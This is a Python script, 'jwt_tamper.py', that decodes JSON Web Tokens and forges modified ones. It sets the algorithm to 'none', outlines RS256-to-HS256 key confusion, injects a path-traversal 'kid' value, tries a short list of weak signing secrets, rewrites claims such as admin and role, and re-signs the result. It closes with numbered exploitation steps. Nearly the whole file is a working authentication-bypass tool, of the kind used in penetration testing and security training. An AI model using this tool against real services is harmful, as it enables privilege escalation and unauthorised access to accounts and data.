#!/usr/bin/env python3
"""
JWT Tamper - Decode, modify, and tamper with JWT tokens.

Usage:
    python jwt_tamper.py <jwt_token> [new_claim=value ...]

Example:
    python jwt_tamper.py "eyJ..." admin=true
    python jwt_tamper.py "eyJ..." sub=admin role=admin
    python jwt_tamper.py "eyJ..."  # Just decode
"""

import sys
import json
import base64
import hmac
import hashlib
from urllib.parse import quote, unquote

# ===== JWT Helper Functions =====


def base64_url_decode(data):
    """Decode base64url (with padding fix)"""
    data = data.encode() if isinstance(data, str) else data
    # Add padding if needed
    padding = 4 - len(data) % 4
    if padding != 4:
        data += b"=" * padding
    return base64.urlsafe_b64decode(data)


def base64_url_encode(data):
    """Encode to base64url (no padding)"""
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def decode_jwt(token):
    """Decode JWT and return header, payload, signature"""
    parts = token.split(".")

    if len(parts) != 3:
        print("[-] Invalid JWT format (must be header.payload.signature)")
        return None, None, None

    try:
        header = json.loads(base64_url_decode(parts[0]))
        payload = json.loads(base64_url_decode(parts[1]))
        signature = parts[2]

        return header, payload, signature
    except Exception as e:
        print(f"[-] Decode error: {e}")
        return None, None, None


def encode_jwt(header, payload, signature_input=None):
    """Encode JWT back to string"""
    header_b64 = base64_url_encode(json.dumps(header, separators=(",", ":")))
    payload_b64 = base64_url_encode(json.dumps(payload, separators=(",", ":")))

    if signature_input is None:
        signature_b64 = ""
    else:
        signature_b64 = signature_input

    return f"{header_b64}.{payload_b64}.{signature_b64}"


def print_jwt_info(header, payload, signature):
    """Pretty print JWT components"""
    print("\n[*] JWT Header:")
    print(f"    {json.dumps(header, indent=2)}")

    print("\n[*] JWT Payload:")
    print(f"    {json.dumps(payload, indent=2)}")

    print(f"\n[*] Signature: {signature[:20]}...")


def test_algorithm_bypass(token, header, payload):
    """Test for algorithm confusion and 'none' algorithm"""
    print("\n[*] Testing Algorithm Bypasses:")

    # Test 1: Change alg to 'none'
    print("\n[+] Test 1: Change algorithm to 'none'")
    header_none = header.copy()
    header_none["alg"] = "none"
    token_none = encode_jwt(header_none, payload, "")
    print(f"    Modified token: {token_none}")
    print("    Try sending this token with empty signature")

    # Test 2: Key confusion (HS256 <-> RS256)
    if header.get("alg") == "RS256":
        print("\n[+] Test 2: Key confusion attack (RS256 -> HS256)")
        header_hs = header.copy()
        header_hs["alg"] = "HS256"
        # This would need the public key, but show the concept
        token_hs = encode_jwt(header_hs, payload, "")
        print(f"    Modified header (HS256): {json.dumps(header_hs)}")
        print("    Would need public key to sign properly")

    # Test 3: Add 'kid' (key id) injection
    print("\n[+] Test 3: 'kid' (key id) injection")
    header_kid = header.copy()
    header_kid["kid"] = "../../../etc/passwd"
    print(f"    Injected kid: {header_kid['kid']}")
    print("    Some servers may use 'kid' unsafely")


def test_payload_tampering(token, payload):
    """Show payload tampering possibilities"""
    print("\n[*] Testing Payload Tampering:")

    common_claims = ["sub", "usr", "admin", "role", "exp", "iat", "aud"]

    print("\n[+] Common claims in JWTs:")
    for claim in common_claims:
        if claim in payload:
            print(f"    {claim}: {payload[claim]}")

    print("\n[+] Try modifying these claims:")
    print(f"    - admin: true")
    print(f"    - role: admin")
    print(f"    - sub: admin_user")
    print(f"    - exp: 9999999999 (far future)")
    print(f"    - iat: 1 (epoch time)")


def check_common_secrets(token):
    """Check if token is signed with common weak secrets"""
    print("\n[*] Checking for weak signatures...")

    parts = token.split(".")
    if len(parts) != 3:
        return

    message = f"{parts[0]}.{parts[1]}"
    signature = parts[2]

    common_secrets = [
        "secret",
        "password",
        "123456",
        "admin",
        "test",
        "key",
        "",  # No secret (none algorithm fallback)
    ]

    print("\n[+] Trying common secrets:")
    for secret in common_secrets:
        # HS256
        h = hmac.new(
            secret.encode() if secret else b"", message.encode(), hashlib.sha256
        )
        computed = base64_url_encode(h.digest())

        if computed == signature:
            print(f"    [!] FOUND: Secret = '{secret}'")
            return secret

        print(f"    - {secret}: no match")

    print("    None found")
    return None


# ===== Main =====
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python jwt_tamper.py <jwt_token> [claim=value ...]")
        print("\nExample:")
        print("  python jwt_tamper.py 'eyJ...' admin=true")
        print("  python jwt_tamper.py 'eyJ...' sub=admin role=admin")
        print("  python jwt_tamper.py 'eyJ...'  # Just decode")
        sys.exit(1)

    token = sys.argv[1]

    print("[*] JWT Tamper Tool")
    print(f"[*] Token: {token[:50]}...")

    # Decode JWT
    header, payload, signature = decode_jwt(token)

    if not header:
        sys.exit(1)

    print_jwt_info(header, payload, signature)

    # Test algorithm bypasses
    test_algorithm_bypass(token, header, payload)

    # Test payload tampering
    test_payload_tampering(token, payload)

    # Check weak secrets
    secret = check_common_secrets(token)

    # Process command line modifications
    if len(sys.argv) > 2:
        print("\n[*] Modifying payload...")

        for arg in sys.argv[2:]:
            if "=" in arg:
                key, value = arg.split("=", 1)

                # Try to parse as different types
                if value.lower() == "true":
                    payload[key] = True
                elif value.lower() == "false":
                    payload[key] = False
                elif value.isdigit():
                    payload[key] = int(value)
                else:
                    payload[key] = value

                print(f"    {key} = {payload[key]}")

        # Generate modified token (without valid signature)
        modified_token = encode_jwt(header, payload, signature)
        print(f"\n[+] Modified token (unsigned):")
        print(f"    {modified_token}")

        # If we found secret, try to sign it
        if secret is not None:
            message = modified_token.rsplit(".", 1)[0]
            h = hmac.new(secret.encode(), message.encode(), hashlib.sha256)
            new_sig = base64_url_encode(h.digest())
            signed_token = f"{message}.{new_sig}"

            print(f"\n[+] Signed with found secret '{secret}':")
            print(f"    {signed_token}")
        else:
            print(f"\n[!] Could not sign (secret unknown)")
            print(f"    Try sending unsigned token or with empty signature")

    print("\n[*] For exploitation:")
    print("    1. Send modified token in Authorization header")
    print("    2. Try 'none' algorithm variant")
    print("    3. Fuzz claim values if weak secret not found")
    print("    4. Check for 'kid' injection in header")
